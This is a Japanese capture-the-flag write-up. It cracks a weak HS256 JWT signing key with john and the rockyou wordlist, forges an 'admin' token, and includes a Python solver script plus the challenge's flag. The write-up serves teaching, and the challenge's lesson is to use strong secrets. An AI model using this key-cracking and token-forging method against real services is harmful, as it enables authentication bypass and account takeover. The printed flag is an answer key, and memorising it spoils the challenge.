# My Weak Secret

```txt
Never use weak secrets. I repeat NEVER.
http://chall.nitdgplug.org:30299
```

## Solution

問題にアクセスすると、ログイン画面が表示されます。

![img1](img/img1.png)

試しに適当な入力でログインしてみると、`/flag` にアクセスして以下の内容が表示されました。

![img2](img/img2.png)

どうやら `admin` でアクセスしてくれということです。

この時のリクエストを見てみると、Cookie の token に JWT が入っていました。

```http
GET /flag HTTP/1.1
Host: chall.nitdgplug.org:30299
 ...
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZXJyb3IifQ.XALcPJYbkoM2OvMjOrFCBb5w4CuYSavfjgCL_RHymjU
Upgrade-Insecure-Requests: 1

```

JWT をデコードしてみると以下の内容になっていて、ペイロードに `user` があることがわかります。

```json
Headers = {
  "alg": "HS256",
  "typ": "JWT"
}

Payload = {
  "user": "error"
}

Signature = "XALcPJYbkoM2OvMjOrFCBb5w4CuYSavfjgCL_RHymjU"
```

今回の JWT は、`HS256` のアルゴリズムで署名されています。

そして問題文にあるように弱いシークレットキーで署名がされていると推測できます。

なのでパスワードクラックツールである `john` コマンドを使ってシークレットキーをチェックします。

```shell
$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 jwt.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Press 'q' or Ctrl-C to abort, almost any other key for status
badboy           (?)
1g 0:00:00:00 DONE (2021-04-02 13:09) 100.0g/s 51200p/s 51200c/s 51200C/s 123456..letmein
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

これで署名に使われたシークレットキーが `badboy` とわかりました。

なのでこれを使ってペイロードを以下のように改ざんして新しい JWT を生成させます。

```json
Payload = {
  "user": "admin"
}
```

改ざんには jwt.io を使うと簡単に生成することができます。

Solver
```python
#!/usr/bin/python3
import requests
import re
import jwt

url = 'http://chall.nitdgplug.org:30299/flag'

secret = "badboy"
jwt = jwt.encode({"user": "admin"}, secret, algorithm="HS256")
jar = {'token': jwt}

response = requests.get(url, cookies=jar)
source = response.text

print(re.findall(r'(GLUG\{.+\})', source)[0])
```

```shell
$ python3 solve.py
GLUG{us3_5tr0ng_jw7_s3cr37}
```

## Flag

flag : `GLUG{us3_5tr0ng_jw7_s3cr37}`